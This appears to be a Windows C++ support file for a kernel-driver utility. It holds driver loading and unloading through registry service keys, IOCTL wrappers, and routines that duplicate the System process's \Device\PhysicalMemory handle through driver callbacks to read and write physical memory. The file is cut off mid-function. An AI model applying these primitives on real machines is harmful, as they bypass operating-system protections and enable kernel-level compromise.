/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2025
*
*  TITLE:       SUP.CPP
*
*  VERSION:     1.45
*
*  DATE:        02 Dec 2025
*
*  Program global support routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"

/*
* supHeapAlloc
*
* Purpose:
*
* Wrapper for RtlAllocateHeap.
*
*/
PVOID FORCEINLINE supHeapAlloc(
    _In_ SIZE_T Size)
{
    return RtlAllocateHeap(NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, Size);
}

/*
* supHeapFree
*
* Purpose:
*
* Wrapper for RtlFreeHeap.
*
*/
BOOL FORCEINLINE supHeapFree(
    _In_ PVOID Memory)
{
    return RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, Memory);
}

/*
* supAllocateLockedMemory
*
* Purpose:
*
* Wrapper for VirtualAllocEx+VirtualLock.
*
*/
PVOID supAllocateLockedMemory(
    _In_ SIZE_T Size,
    _In_ ULONG AllocationType,
    _In_ ULONG Protect
)
{
    PVOID Buffer;
    DWORD lastError;

    SetLastError(ERROR_SUCCESS);

    Buffer = VirtualAllocEx(NtCurrentProcess(),
        NULL,
        Size,
        AllocationType,
        Protect);

    if (Buffer) {

        if (!VirtualLock(Buffer, Size)) {

            lastError = GetLastError();

            VirtualFreeEx(NtCurrentProcess(),
                Buffer,
                0,
                MEM_RELEASE);

            SetLastError(lastError);

            Buffer = NULL;
        }

    }

    return Buffer;
}

/*
* supFreeLockedMemory
*
* Purpose:
*
* Wrapper for VirtualUnlock + VirtualFreeEx.
*
*/
BOOL supFreeLockedMemory(
    _In_ PVOID Memory,
    _In_ SIZE_T LockedSize
)
{
    BOOL bUnlocked, bFreed;
    DWORD e = ERROR_SUCCESS;

    if (Memory == NULL)
        return FALSE;

    bUnlocked = VirtualUnlock(Memory, LockedSize);
    if (!bUnlocked)
        e = GetLastError();

    bFreed = VirtualFreeEx(NtCurrentProcess(), Memory, 0, MEM_RELEASE);
    if (!bFreed && e == ERROR_SUCCESS)
        e = GetLastError();

    SetLastError(e);
    return (bUnlocked && bFreed);
}

/*
* supCallDriverEx
*
* Purpose:
*
* Call driver.
*
*/
NTSTATUS supCallDriverEx(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG IoControlCode,
    _In_ PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _In_opt_ PVOID OutputBuffer,
    _In_opt_ ULONG OutputBufferLength,
    _Out_opt_ PIO_STATUS_BLOCK IoStatus)
{
    IO_STATUS_BLOCK ioStatus;

    NTSTATUS ntStatus = NtDeviceIoControlFile(DeviceHandle,
        NULL,
        NULL,
        NULL,
        &ioStatus,
        IoControlCode,
        InputBuffer,
        InputBufferLength,
        OutputBuffer,
        OutputBufferLength);

    if (ntStatus == STATUS_PENDING) {

        ntStatus = NtWaitForSingleObject(DeviceHandle,
            FALSE,
            NULL);

        if (NT_SUCCESS(ntStatus))
            ntStatus = ioStatus.Status;

    }

    if (IoStatus)
        *IoStatus = ioStatus;

    return ntStatus;
}

/*
* supCallDriver
*
* Purpose:
*
* Call driver.
*
*/
BOOL supCallDriver(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG IoControlCode,
    _In_ PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _In_opt_ PVOID OutputBuffer,
    _In_opt_ ULONG OutputBufferLength)
{
    BOOL bResult;
    IO_STATUS_BLOCK ioStatus;

    NTSTATUS ntStatus = supCallDriverEx(
        DeviceHandle,
        IoControlCode,
        InputBuffer,
        InputBufferLength,
        OutputBuffer,
        OutputBufferLength,
        &ioStatus);

    bResult = NT_SUCCESS(ntStatus);
    SetLastError(RtlNtStatusToDosError(ntStatus));
    return bResult;
}

/*
* supMapPhysicalMemory
*
* Purpose:
*
* Map physical memory.
*
*/
PVOID supMapPhysicalMemory(
    _In_ HANDLE SectionHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ ULONG NumberOfBytes,
    _In_ BOOL MapForWrite
)
{
    PVOID viewBase = NULL;
    ULONG ulProtect;
    LARGE_INTEGER sectionBase;
    SIZE_T viewSize;

    if (MapForWrite)
        ulProtect = PAGE_READWRITE;
    else
        ulProtect = PAGE_READONLY;

    ULONG_PTR offset = PhysicalAddress & ~(PAGE_SIZE - 1);

    sectionBase.QuadPart = offset;
    viewSize = (PhysicalAddress - offset) + NumberOfBytes;

    NTSTATUS ntStatus = NtMapViewOfSection(SectionHandle,
        NtCurrentProcess(),
        &viewBase,
        0,
        0,
        &sectionBase,
        &viewSize,
        ViewUnmap,
        NULL,
        ulProtect);

    if (!NT_SUCCESS(ntStatus)) {
        SetLastError(RtlNtStatusToDosError(ntStatus));
    }
    else {
        return viewBase;
    }

    return NULL;
}

/*
* supUnmapPhysicalMemory
*
* Purpose:
*
* Unmap physical memory view.
*
*/
VOID supUnmapPhysicalMemory(
    _In_ PVOID BaseAddress
)
{
    NtUnmapViewOfSection(NtCurrentProcess(), BaseAddress);
}

/*
* supReadWritePhysicalMemory
*
* Purpose:
*
* Read/Write physical memory.
*
*/
BOOL WINAPI supReadWritePhysicalMemory(
    _In_ HANDLE SectionHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes,
    _In_ BOOLEAN DoWrite)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PVOID mappedSection = NULL;

    ULONG_PTR offset;

    mappedSection = supMapPhysicalMemory(SectionHandle,
        PhysicalAddress,
        NumberOfBytes,
        DoWrite);

    if (mappedSection) {

        offset = PhysicalAddress - (PhysicalAddress & ~(PAGE_SIZE - 1));

        __try {

            if (DoWrite) {
                RtlCopyMemory(RtlOffsetToPointer(mappedSection, offset), Buffer, NumberOfBytes);
            }
            else {
                RtlCopyMemory(Buffer, RtlOffsetToPointer(mappedSection, offset), NumberOfBytes);
            }

            bResult = TRUE;
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            bResult = FALSE;
            dwError = GetExceptionCode();
        }

        supUnmapPhysicalMemory(mappedSection);

    }
    else {
        dwError = GetLastError();
    }

    SetLastError(dwError);
    return bResult;
}

/*
* supOpenPhysicalMemory2
*
* Purpose:
*
* Locate and open physical memory section for read/write.
*
*/
BOOL WINAPI supOpenPhysicalMemory2(
    _In_ HANDLE DeviceHandle,
    _In_ pfnDuplicateHandleCallback DuplicateHandleCallback,
    _Out_ PHANDLE PhysicalMemoryHandle)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_NOT_FOUND;
    ULONG sectionObjectType = (ULONG)-1;
    HANDLE sectionHandle = NULL;
    PSYSTEM_HANDLE_INFORMATION_EX handleArray = NULL;
    UNICODE_STRING ustr;
    OBJECT_ATTRIBUTES obja;
    UNICODE_STRING usSection;

    do {

        *PhysicalMemoryHandle = NULL;

        RtlInitUnicodeString(&ustr, L"\\KnownDlls\\kernel32.dll");
        InitializeObjectAttributes(&obja, &ustr, OBJ_CASE_INSENSITIVE, NULL, NULL);

        NTSTATUS ntStatus = NtOpenSection(&sectionHandle, SECTION_QUERY, &obja);

        if (!NT_SUCCESS(ntStatus)) {
            dwError = RtlNtStatusToDosError(ntStatus);
            break;
        }

        handleArray = (PSYSTEM_HANDLE_INFORMATION_EX)supGetSystemInfo(SystemExtendedHandleInformation);
        if (handleArray == NULL) {
            dwError = ERROR_NOT_ENOUGH_MEMORY;
            break;
        }

        ULONG i;
        DWORD currentProcessId = GetCurrentProcessId();

        for (i = 0; i < handleArray->NumberOfHandles; i++) {
            if (handleArray->Handles[i].UniqueProcessId == currentProcessId &&
                handleArray->Handles[i].HandleValue == (ULONG_PTR)sectionHandle)
            {
                sectionObjectType = handleArray->Handles[i].ObjectTypeIndex;
                break;
            }
        }

        NtClose(sectionHandle);
        sectionHandle = NULL;

        if (sectionObjectType == (ULONG)-1) {
            dwError = ERROR_INVALID_DATATYPE;
            break;
        }

        RtlInitUnicodeString(&usSection, L"\\Device\\PhysicalMemory");

        for (i = 0; i < handleArray->NumberOfHandles; i++) {
            if (handleArray->Handles[i].UniqueProcessId == SYSTEM_PID_MAGIC &&
                handleArray->Handles[i].ObjectTypeIndex == (ULONG_PTR)sectionObjectType &&
                handleArray->Handles[i].GrantedAccess == SECTION_ALL_ACCESS)
            {
                HANDLE testHandle = NULL;

                if (DuplicateHandleCallback(DeviceHandle,
                    UlongToHandle(SYSTEM_PID_MAGIC),
                    NULL,
                    (HANDLE)handleArray->Handles[i].HandleValue,
                    &testHandle,
                    MAXIMUM_ALLOWED,
                    0,
                    0))
                {
                    union {
                        BYTE* Buffer;
                        POBJECT_NAME_INFORMATION Information;
                    } NameInfo;

                    NameInfo.Buffer = NULL;

                    ntStatus = supQueryObjectInformation(testHandle,
                        ObjectNameInformation,
                        (PVOID*)&NameInfo.Buffer,
                        NULL,
                        (PNTSUPMEMALLOC)supHeapAlloc,
                        (PNTSUPMEMFREE)supHeapFree);

                    if (NT_SUCCESS(ntStatus) && NameInfo.Buffer) {

                        if (RtlEqualUnicodeString(&usSection, &NameInfo.Information->Name, TRUE)) {
                            *PhysicalMemoryHandle = testHandle;
                            bResult = TRUE;
                        }

                        supHeapFree(NameInfo.Buffer);
                    }

                    if (bResult == FALSE)
                        NtClose(testHandle);
                }

                if (bResult)
                    break;

            }
        }

    } while (FALSE);

    if (sectionHandle) NtClose(sectionHandle);
    if (handleArray) supHeapFree(handleArray);

    if (bResult) dwError = ERROR_SUCCESS;

    SetLastError(dwError);
    return bResult;
}

/*
* supOpenPhysicalMemory
*
* Purpose:
*
* Locate and open physical memory section for read/write.
*
*/
BOOL WINAPI supOpenPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ pfnOpenProcessCallback OpenProcessCallback,
    _In_ pfnDuplicateHandleCallback DuplicateHandleCallback,
    _Out_ PHANDLE PhysicalMemoryHandle)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_NOT_FOUND;
    ULONG sectionObjectType = (ULONG)-1;
    HANDLE processHandle = NULL;
    HANDLE sectionHandle = NULL;
    PSYSTEM_HANDLE_INFORMATION_EX handleArray = NULL;
    UNICODE_STRING ustr;
    OBJECT_ATTRIBUTES obja;
    UNICODE_STRING usSection;

    do {

        *PhysicalMemoryHandle = NULL;

        if (!OpenProcessCallback(DeviceHandle,
            UlongToHandle(SYSTEM_PID_MAGIC),
            PROCESS_ALL_ACCESS,
            &processHandle))
        {
            dwError = GetLastError();
            break;
        }

        RtlInitUnicodeString(&ustr, L"\\KnownDlls\\kernel32.dll");
        InitializeObjectAttributes(&obja, &ustr, OBJ_CASE_INSENSITIVE, NULL, NULL);

        NTSTATUS ntStatus = NtOpenSection(&sectionHandle, SECTION_QUERY, &obja);

        if (!NT_SUCCESS(ntStatus)) {
            dwError = RtlNtStatusToDosError(ntStatus);
            break;
        }

        handleArray = (PSYSTEM_HANDLE_INFORMATION_EX)supGetSystemInfo(SystemExtendedHandleInformation);
        if (handleArray == NULL) {
            dwError = ERROR_NOT_ENOUGH_MEMORY;
            break;
        }

        ULONG i;
        DWORD currentProcessId = GetCurrentProcessId();

        for (i = 0; i < handleArray->NumberOfHandles; i++) {
            if (handleArray->Handles[i].UniqueProcessId == currentProcessId &&
                handleArray->Handles[i].HandleValue == (ULONG_PTR)sectionHandle)
            {
                sectionObjectType = handleArray->Handles[i].ObjectTypeIndex;
                break;
            }
        }

        NtClose(sectionHandle);
        sectionHandle = NULL;

        if (sectionObjectType == (ULONG)-1) {
            dwError = ERROR_INVALID_DATATYPE;
            break;
        }

        RtlInitUnicodeString(&usSection, L"\\Device\\PhysicalMemory");

        for (i = 0; i < handleArray->NumberOfHandles; i++) {
            if (handleArray->Handles[i].UniqueProcessId == SYSTEM_PID_MAGIC &&
                handleArray->Handles[i].ObjectTypeIndex == (ULONG_PTR)sectionObjectType &&
                handleArray->Handles[i].GrantedAccess == SECTION_ALL_ACCESS)
            {
                HANDLE testHandle = NULL;

                if (DuplicateHandleCallback(DeviceHandle,
                    UlongToHandle(SYSTEM_PID_MAGIC),
                    processHandle,
                    (HANDLE)handleArray->Handles[i].HandleValue,
                    &testHandle,
                    MAXIMUM_ALLOWED,
                    0,
                    0))
                {
                    union {
                        BYTE* Buffer;
                        POBJECT_NAME_INFORMATION Information;
                    } NameInfo;

                    NameInfo.Buffer = NULL;

                    ntStatus = supQueryObjectInformation(testHandle,
                        ObjectNameInformation,
                        (PVOID*)&NameInfo.Buffer,
                        NULL,
                        (PNTSUPMEMALLOC)supHeapAlloc,
                        (PNTSUPMEMFREE)supHeapFree);

                    if (NT_SUCCESS(ntStatus) && NameInfo.Buffer) {

                        if (RtlEqualUnicodeString(&usSection, &NameInfo.Information->Name, TRUE)) {
                            *PhysicalMemoryHandle = testHandle;
                            bResult = TRUE;
                        }

                        supHeapFree(NameInfo.Buffer);
                    }

                    if (bResult == FALSE)
                        NtClose(testHandle);
                }

                if (bResult)
                    break;

            }
        }

    } while (FALSE);

    if (sectionHandle) NtClose(sectionHandle);
    if (processHandle) NtClose(processHandle);
    if (handleArray) supHeapFree(handleArray);

    if (bResult) dwError = ERROR_SUCCESS;

    SetLastError(dwError);
    return bResult;
}

/*
* supChkSum
*
* Purpose:
*
* Calculate partial checksum for given buffer.
*
*/
USHORT supChkSum(
    ULONG PartialSum,
    PUSHORT Source,
    ULONG Length
)
{
    while (Length--) {
        PartialSum += *Source++;
        PartialSum = (PartialSum >> 16) + (PartialSum & 0xffff);
    }
    return (USHORT)(((PartialSum >> 16) + PartialSum) & 0xffff);
}

/*
* supCalculateCheckSumForMappedFile
*
* Purpose:
*
* Calculate PE file checksum.
*
*/
DWORD supCalculateCheckSumForMappedFile(
    _In_ PVOID BaseAddress,
    _In_ ULONG FileLength
)
{
    PUSHORT AdjustSum;
    PIMAGE_NT_HEADERS NtHeaders;
    USHORT PartialSum;
    ULONG CheckSum;

    PartialSum = supChkSum(0, (PUSHORT)BaseAddress, (FileLength + 1) >> 1);

    NtHeaders = RtlImageNtHeader(BaseAddress);
    if (NtHeaders != NULL) {
        AdjustSum = (PUSHORT)(&NtHeaders->OptionalHeader.CheckSum);
        PartialSum -= (PartialSum < AdjustSum[0]);
        PartialSum -= AdjustSum[0];
        PartialSum -= (PartialSum < AdjustSum[1]);
        PartialSum -= AdjustSum[1];
    }
    else
    {
        PartialSum = 0;
    }
    CheckSum = (ULONG)PartialSum + FileLength;
    return CheckSum;
}

/*
* supVerifyMappedImageMatchesChecksum
*
* Purpose:
*
* Calculate PE file checksum and compare it with checksum in PE header.
*
*/
BOOLEAN supVerifyMappedImageMatchesChecksum(
    _In_ PVOID BaseAddress,
    _In_ ULONG FileLength,
    _Out_opt_ PULONG HeaderChecksum,
    _Out_opt_ PULONG CalculatedChecksum
)
{
    PUSHORT AdjustSum;
    PIMAGE_NT_HEADERS NtHeaders;
    ULONG HeaderSum;
    ULONG CheckSum;
    USHORT PartialSum;

    PartialSum = supChkSum(0, (PUSHORT)BaseAddress, (FileLength + 1) >> 1);

    NtHeaders = RtlImageNtHeader(BaseAddress);
    if (NtHeaders) {
        AdjustSum = (PUSHORT)(&NtHeaders->OptionalHeader.CheckSum);
        PartialSum -= (PartialSum < AdjustSum[0]);
        PartialSum -= AdjustSum[0];
        PartialSum -= (PartialSum < AdjustSum[1]);
        PartialSum -= AdjustSum[1];
        HeaderSum = NtHeaders->OptionalHeader.CheckSum;
    }
    else {
        HeaderSum = FileLength;
        PartialSum = 0;
    }

    CheckSum = (ULONG)PartialSum + FileLength;

    if (HeaderChecksum)
        *HeaderChecksum = HeaderSum;
    if (CalculatedChecksum)
        *CalculatedChecksum = CheckSum;

    return (CheckSum == HeaderSum);
}

typedef struct _REGSTACK_ENTRY {
    WCHAR SubKey[MAX_PATH + 1];
} REGSTACK_ENTRY, * PREGSTACK_ENTRY;

/*
* supxDeleteKeyTreeWorker
*
* Purpose:
*
* Delete key and it subkeys/values.
*
*/
BOOL supxDeleteKeyTreeWorker(
    _In_ HKEY hKeyRoot,
    _In_ LPWSTR lpSubKey
)
{
    HKEY hKey;
    LONG lResult;
    DWORD dwSize;
    FILETIME ftWrite;
    WCHAR szName[MAX_PATH + 1];
    WCHAR workingPath[MAX_PATH * 2];
    USHORT depthStack[256]; // depth (path length in WCHARs, excluding terminator)
    INT sp = -1;
    SIZE_T baseLen, curLen;
    SIZE_T nameLen;
    BOOL hasTrailingSlash;
    PWCHAR p;

    if (lpSubKey == NULL || lpSubKey[0] == 0)
        return FALSE;

    RtlSecureZeroMemory(depthStack, sizeof(depthStack));
    _strncpy(workingPath, RTL_NUMBER_OF(workingPath), lpSubKey, RTL_NUMBER_OF(workingPath) - 1);

    //
    // Try fast delete first.
    //
    lResult = RegDeleteKey(hKeyRoot, workingPath);
    if (lResult == ERROR_SUCCESS || lResult == ERROR_FILE_NOT_FOUND)
        return TRUE;

    lResult = RegOpenKeyEx(hKeyRoot, workingPath, 0, KEY_READ, &hKey);
    if (lResult != ERROR_SUCCESS) {
        if (lResult == ERROR_FILE_NOT_FOUND)
            return TRUE;
        return FALSE;
    }
    RegCloseKey(hKey);

    //
    // Normalize base path: remove trailing backslashes (keep root form if any).
    //
    baseLen = _strlen(workingPath);
    while (baseLen > 0 && workingPath[baseLen - 1] == L'\\') {
        workingPath[baseLen - 1] = 0;
        baseLen--;
    }
    if (baseLen == 0)
        return FALSE;

    ++sp;
    depthStack[sp] = (USHORT)baseLen;

    while (sp >= 0) {

        curLen = depthStack[sp];
        workingPath[curLen] = 0;

        lResult = RegOpenKeyEx(hKeyRoot, workingPath, 0, KEY_READ, &hKey);
        if (lResult != ERROR_SUCCESS) {
            if (lResult == ERROR_FILE_NOT_FOUND) {
                sp--;
                continue;
            }
            return FALSE;
        }

        dwSize = MAX_PATH;
        lResult = RegEnumKeyEx(hKey, 0, szName, &dwSize, NULL, NULL, NULL, &ftWrite);

        if (lResult == ERROR_NO_MORE_ITEMS) {

            RegCloseKey(hKey);
            RegDeleteKey(hKeyRoot, workingPath);
            sp--;
            continue;
        }

        if (lResult != ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return FALSE;
        }

        RegCloseKey(hKey);

        //
        // Append child: workingPath + '\' + child + '\'.
        //
        nameLen = dwSize;
        hasTrailingSlash = (curLen > 0 && workingPath[curLen - 1] == L'\\');

        //
        // Ensure capacity: base + optional '\' + name + optional '\' + 0.
        //
        if (curLen + (hasTrailingSlash ? 0 : 1) + nameLen + 1 + 1 >= RTL_NUMBER_OF(workingPath))
            return FALSE;

        p = workingPath + curLen;
        if (!hasTrailingSlash) {
            *p++ = L'\\';
            curLen++;
        }

        _strncpy(p, RTL_NUMBER_OF(workingPath) - curLen, szName, nameLen);
        p[nameLen] = 0;
        curLen += nameLen;

        //
        // Add trailing backslash to simplify appending next level.
        //
        p = workingPath + curLen;
        *p++ = L'\\';
        *p = 0;
        curLen++;

        if (++sp >= (INT)RTL_NUMBER_OF(depthStack))
            return FALSE;

        depthStack[sp] = (USHORT)curLen;
    }

    return TRUE;
}

/*
* supRegDeleteKeyTree
*
* Purpose:
*
* Delete key and all it subkeys/values.
*
* Remark:
*
* SubKey should not be longer than 260 chars.
*
*/
BOOL supRegDeleteKeyTree(
    _In_ HKEY hKeyRoot,
    _In_ LPCWSTR lpSubKey)
{
    WCHAR szKeyName[MAX_PATH * 2];

    if (lpSubKey == NULL)
        return FALSE;

    RtlSecureZeroMemory(szKeyName, sizeof(szKeyName));
    _strncpy(szKeyName, RTL_NUMBER_OF(szKeyName), lpSubKey, RTL_NUMBER_OF(szKeyName) - 1);

    return supxDeleteKeyTreeWorker(hKeyRoot, szKeyName);
}

/*
* supRegWriteValueDWORD
*
* Purpose:
*
* Write DWORD value to the registry.
*
*/
NTSTATUS supRegWriteValueDWORD(
    _In_ HANDLE RegistryHandle,
    _In_ LPCWSTR ValueName,
    _In_ DWORD ValueData
)
{
    UNICODE_STRING valueName;

    RtlInitUnicodeString(&valueName, ValueName);
    return NtSetValueKey(RegistryHandle, &valueName, 0, REG_DWORD,
        (PVOID)&ValueData, sizeof(DWORD));
}

/*
* supRegWriteValueString
*
* Purpose:
*
* Write string value to the registry.
*
*/
NTSTATUS supRegWriteValueString(
    _In_ HANDLE RegistryHandle,
    _In_ LPCWSTR ValueName,
    _In_ LPCWSTR ValueData
)
{
    NTSTATUS status;
    UNICODE_STRING valueName;
    SIZE_T length;
    SIZE_T bytesNeeded;
    PWCHAR buffer;
    WCHAR smallBuf[64];

    if (ValueName == NULL || ValueData == NULL)
        return STATUS_INVALID_PARAMETER;

    RtlInitUnicodeString(&valueName, ValueName);

    length = _strlen(ValueData);
    if (length == 0) {
        smallBuf[0] = 0;
        return NtSetValueKey(RegistryHandle, &valueName, 0, REG_SZ,
            smallBuf, (ULONG)sizeof(UNICODE_NULL));
    }

    if (length >= 0xFFFFFFFF / sizeof(WCHAR))
        return STATUS_INVALID_PARAMETER;

    bytesNeeded = (length + 1) * sizeof(WCHAR);

    if (length < RTL_NUMBER_OF(smallBuf)) {
        buffer = smallBuf;
        _strncpy(buffer, RTL_NUMBER_OF(smallBuf), ValueData, RTL_NUMBER_OF(smallBuf));
    }
    else {
        buffer = (PWCHAR)supHeapAlloc(bytesNeeded);
        if (buffer == NULL)
            return STATUS_INSUFFICIENT_RESOURCES;
        _strncpy(buffer, bytesNeeded / sizeof(WCHAR), ValueData, bytesNeeded / sizeof(WCHAR));
    }

    status = NtSetValueKey(RegistryHandle,
        &valueName,
        0,
        REG_SZ,
        buffer,
        (ULONG)bytesNeeded);

    if (buffer != smallBuf)
        supHeapFree(buffer);

    return status;
}

/*
* supxCreateDriverEntry
*
* Purpose:
*
* Creating registry entry for driver.
*
*/
NTSTATUS supxCreateDriverEntry(
    _In_opt_ LPCWSTR DriverPath,
    _In_ LPCWSTR KeyName
)
{
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    DWORD dwData, dwResult;
    HKEY keyHandle = NULL;
    UNICODE_STRING driverImagePath;

    RtlInitEmptyUnicodeString(&driverImagePath, NULL, 0);

    if (DriverPath) {
        if (!RtlDosPathNameToNtPathName_U(DriverPath,
            &driverImagePath,
            NULL,
            NULL))
        {
            return STATUS_INVALID_PARAMETER_2;
        }
    }

    if (ERROR_SUCCESS != RegCreateKeyEx(HKEY_LOCAL_MACHINE,
        KeyName,
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_ALL_ACCESS,
        NULL,
        &keyHandle,
        NULL))
    {
        status = STATUS_ACCESS_DENIED;
        goto Cleanup;
    }

    dwResult = ERROR_SUCCESS;

    do {

        dwData = SERVICE_ERROR_NORMAL;
        dwResult = RegSetValueEx(keyHandle,
            TEXT("ErrorControl"),
            0,
            REG_DWORD,
            (BYTE*)&dwData,
            sizeof(dwData));
        if (dwResult != ERROR_SUCCESS)
            break;

        dwData = SERVICE_KERNEL_DRIVER;
        dwResult = RegSetValueEx(keyHandle,
            TEXT("Type"),
            0,
            REG_DWORD,
            (BYTE*)&dwData,
            sizeof(dwData));
        if (dwResult != ERROR_SUCCESS)
            break;

        dwData = SERVICE_DEMAND_START;
        dwResult = RegSetValueEx(keyHandle,
            TEXT("Start"),
            0,
            REG_DWORD,
            (BYTE*)&dwData,
            sizeof(dwData));

        if (dwResult != ERROR_SUCCESS)
            break;

        if (DriverPath) {
            dwResult = RegSetValueEx(keyHandle,
                TEXT("ImagePath"),
                0,
                REG_EXPAND_SZ,
                (BYTE*)driverImagePath.Buffer,
                (DWORD)driverImagePath.Length + sizeof(UNICODE_NULL));
        }

    } while (FALSE);

    RegCloseKey(keyHandle);

    if (dwResult != ERROR_SUCCESS) {
        status = STATUS_ACCESS_DENIED;
    }
    else
    {
        status = STATUS_SUCCESS;
    }

Cleanup:
    if (DriverPath) {
        if (driverImagePath.Buffer) {
            RtlFreeUnicodeString(&driverImagePath);
        }
    }
    return status;
}

/*
* supLoadDriverEx
*
* Purpose:
*
* Install driver and load it.
*
* N.B.
* SE_LOAD_DRIVER_PRIVILEGE is required to be assigned and enabled.
*
*/
NTSTATUS supLoadDriverEx(
    _In_ LPCWSTR DriverName,
    _In_ LPCWSTR DriverPath,
    _In_ BOOLEAN UnloadPreviousInstance,
    _In_opt_ pfnLoadDriverCallback Callback,
    _In_opt_ PVOID CallbackParam
)
{
    SIZE_T keyOffset;
    NTSTATUS status;
    UNICODE_STRING driverServiceName;

    WCHAR szBuffer[MAX_PATH + 1];

    if (DriverName == NULL)
        return STATUS_INVALID_PARAMETER_1;
    if (DriverPath == NULL)
        return STATUS_INVALID_PARAMETER_2;

    RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));

    keyOffset = RTL_NUMBER_OF(NT_REG_PREP);

    if (FAILED(StringCchPrintf(szBuffer, MAX_PATH,
        DRIVER_REGKEY,
        NT_REG_PREP,
        DriverName)))
    {
        return STATUS_INVALID_PARAMETER_1;
    }

    status = supxCreateDriverEntry(DriverPath,
        &szBuffer[keyOffset]);

    if (!NT_SUCCESS(status))
        return status;

    RtlInitUnicodeString(&driverServiceName, szBuffer);

    if (Callback) {
        status = Callback(&driverServiceName, CallbackParam);
        if (!NT_SUCCESS(status))
            return status;
    }

    status = NtLoadDriver(&driverServiceName);

    if (UnloadPreviousInstance) {
        if ((status == STATUS_IMAGE_ALREADY_LOADED) ||
            (status == STATUS_OBJECT_NAME_COLLISION) ||
            (status == STATUS_OBJECT_NAME_EXISTS))
        {
            status = NtUnloadDriver(&driverServiceName);
            if (NT_SUCCESS(status)) {
                status = NtLoadDriver(&driverServiceName);
            }
        }
    }
    else {
        if (status == STATUS_OBJECT_NAME_EXISTS)
            status = STATUS_SUCCESS;
    }

    return status;
}

/*
* supLoadDriver
*
* Purpose:
*
* Install driver and load it.
*
* N.B.
* SE_LOAD_DRIVER_PRIVILEGE is required to be assigned and enabled.
*
*/
NTSTATUS supLoadDriver(
    _In_ LPCWSTR DriverName,
    _In_ LPCWSTR DriverPath,
    _In_ BOOLEAN UnloadPreviousInstance
)
{
    return supLoadDriverEx(DriverName,
        DriverPath,
        UnloadPreviousInstance,
        NULL,
        NULL);
}

/*
* supUnloadDriver
*
* Purpose:
*
* Call driver unload and remove corresponding registry key.
*
* N.B.
* SE_LOAD_DRIVER_PRIVILEGE is required to be assigned and enabled.
*
*/
NTSTATUS supUnloadDriver(
    _In_ LPCWSTR DriverName,
    _In_ BOOLEAN fRemove
)
{
    NTSTATUS status;
    SIZE_T keyOffset;
    UNICODE_STRING driverServiceName;

    WCHAR szBuffer[MAX_PATH + 1];

    RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));

    if (FAILED(StringCchPrintf(szBuffer, MAX_PATH,
        DRIVER_REGKEY,
        NT_REG_PREP,
        DriverName)))
    {
        return STATUS_INVALID_PARAMETER_1;
    }

    keyOffset = RTL_NUMBER_OF(NT_REG_PREP);

    status = supxCreateDriverEntry(NULL,
        &szBuffer[keyOffset]);

    if (!NT_SUCCESS(status))
        return status;

    RtlInitUnicodeString(&driverServiceName, szBuffer);
    status = NtUnloadDriver(&driverServiceName);

    if (NT_SUCCESS(status)) {
        if (fRemove)
            supRegDeleteKeyTree(HKEY_LOCAL_MACHINE, &szBuffer[keyOffset]);
    }

    return status;
}

/*
* supOpenDriverEx
*
* Purpose:
*
* Open handle for driver.
*
*/
NTSTATUS supOpenDriverEx(
    _In_ LPCWSTR DriverName,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_opt_ PHANDLE DeviceHandle
)
{
    HANDLE deviceHandle = NULL;
    UNICODE_STRING usDeviceLink;
    OBJECT_ATTRIBUTES obja;
    IO_STATUS_BLOCK iost;

    NTSTATUS ntStatus;

    RtlInitUnicodeString(&usDeviceLink, DriverName);
    InitializeObjectAttributes(&obja, &usDeviceLink, OBJ_CASE_INSENSITIVE, NULL, NULL);

    ntStatus = NtCreateFile(&deviceHandle,
        DesiredAccess,
        &obja,
        &iost,
        NULL,
        0,
        0,
        FILE_OPEN,
        FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0);

    if (NT_SUCCESS(ntStatus)) {
        if (DeviceHandle)
            *DeviceHandle = deviceHandle;
    }

    return ntStatus;
}

/*
* supOpenDriver
*
* Purpose:
*
* Open handle for driver through \\DosDevices.
*
*/
NTSTATUS supOpenDriver(
    _In_ LPCWSTR DriverName,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE DeviceHandle
)
{
    NTSTATUS status = STATUS_UNSUCCESSFUL; 

    // assume failure
    if (DeviceHandle)
        *DeviceHandle = NULL;
    else
        return STATUS_INVALID_PARAMETER_2;

    if (DriverName) {

        WCHAR szDeviceLink[MAX_PATH + 1];

        RtlSecureZeroMemory(szDeviceLink, sizeof(szDeviceLink));

        if (FAILED(StringCchPrintf(szDeviceLink,
            MAX_PATH,
            TEXT("\\DosDevices\\%wS"),
            DriverName)))
        {
            return STATUS_INVALID_PARAMETER_1;
        }

        status = supOpenDriverEx(szDeviceLink,
            DesiredAccess,
            DeviceHandle);

        if (status == STATUS_OBJECT_NAME_NOT_FOUND ||
            status == STATUS_NO_SUCH_DEVICE) 
        {

            //
            // Check the case when no symlink available.
            //

            RtlSecureZeroMemory(szDeviceLink, sizeof(szDeviceLink));

            if (FAILED(StringCchPrintf(szDeviceLink,
                MAX_PATH,
                TEXT("\\Device\\%wS"),
                DriverName)))
            {
                return STATUS_INVALID_PARAMETER_1;
            }

